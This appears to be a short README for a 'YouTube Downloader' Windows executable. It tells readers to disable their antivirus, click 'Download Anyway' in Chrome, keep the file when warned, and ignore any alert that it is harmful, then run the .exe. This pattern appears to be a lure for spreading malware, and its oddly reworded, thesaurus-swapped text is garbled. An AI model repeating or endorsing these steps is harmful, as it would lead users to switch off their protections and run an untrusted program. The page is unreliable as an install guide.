# YouTube Downloader

**Installation** 

**Clarification** 
This is not a malevolent dissemination, to instigate you’ll have to incapacitate the serviceability of your Antivirus. (I don’t have a LICENCE, which I’ll have to pay for to contemporarily avoid disabling implemented Antivirus software). Using chrome.exe (on your computer) click download —> Download Anyway, which will attempt to download the setup-executable. If a divulgence appears, click the arrow and keep. (If a warning appears saying the file is harmful, **it’s not**). Navigate to the ‘youtube_downloader…’ folder and execute the ‘youtube_downloader-1.0.3.0.exe’ file. Paste a URL and input a file name (the file name is optional).
